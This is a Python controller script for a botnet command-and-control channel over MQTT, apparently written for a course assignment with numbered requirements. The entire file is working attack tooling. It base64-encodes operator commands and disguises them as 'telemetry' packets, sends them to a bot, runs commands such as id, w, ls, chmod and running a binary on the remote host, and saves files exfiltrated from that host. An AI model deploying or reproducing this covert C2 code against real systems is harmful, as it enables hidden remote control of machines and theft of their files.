import base64
import json
import time
import paho.mqtt.client as mqtt
from consts import *

# This runs whenever the bot sends a response back to the 'sensors' topic
def on_message(client, userdata, msg):
    try:
        packet = json.loads(msg.payload.decode())
        if packet.get("s_id") == STEALTH_ID:
            raw_res = base64.b64decode(packet.get("payload")).decode()
            if "FILE_B64:" in raw_res:
                save_file_from_message(raw_res)
            else:
                print(f"[RESPONSE]: {raw_res}")

    except:
        pass


def save_file_from_message(raw_res):
    try:
        _, filename, b64data = raw_res.split(":", 2)
        with open(f"copied_{filename}", "wb") as f:
            f.write(base64.b64decode(b64data))
        print(f"[SYSTEM]: Successfully copied file: {filename}, saved as copied_{filename}")
    except Exception as e:
        print(f"[SYSTEM]: Error decoding binary file: {e}")


if __name__ == '__main__':
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER, PORT)
    client.subscribe(TOPIC)
    # loop_start() required over loop_forever() to allow sending commands
    client.loop_start()
    print("Controller is ready. Type a command (e.g., 'id', 'w', 'ping'):")
    try:
        while True:
            cmd = input("> ")
            if cmd.lower() == "exit":
                break

            if cmd == "testall":
                print("Testing all Requirements...")
                test_suite = [
                    CMD_ANNOUNCE_BOT, # botStatus, requirement 5.1
                    CMD_WHO_IS_LOGGED_IN, # w, requirement 5.2
                    CMD_LIST_FILES, # ls, requirement 5.3
                    CMD_ID_HOST, # id, requirement 5.4
                    CMD_COPY_FROM_BOT_TO_CONTROLLER + " fileToCopy.txt",  # requirement 5.5
                    CMD_CHMOD_TEST_BINARY, # requirement 5.6
                    CMD_RUN_TEST_BINARY # requirement 5.6
                ]

                for test in test_suite:
                    print(f"[*] Testing: {test}")
                    b64_payload = base64.b64encode(test.encode()).decode()
                    packet = {
                        "s_id": STEALTH_ID,
                        "type": "telemetry",
                        "data": b64_payload
                    }
                    client.publish(TOPIC, f"{BOT_ID}:{test}")
                    time.sleep(1) # Wait for bot response before next test
                continue

            b64_payload = base64.b64encode(cmd.encode()).decode()
            # hide data in base64
            packet = {
                "s_id": STEALTH_ID,
                "type": "telemetry",
                "data": b64_payload
            }

            print("----")
            print(f"[DEBUG]: showcase of the hidden packet being sent:")
            print(json.dumps(packet, indent=4))
            print("----")


            # send the data hidden within a json packet
            client.publish(TOPIC, json.dumps(packet))
            time.sleep(1)
    except KeyboardInterrupt:
        pass

    client.loop_stop()
    client.disconnect()

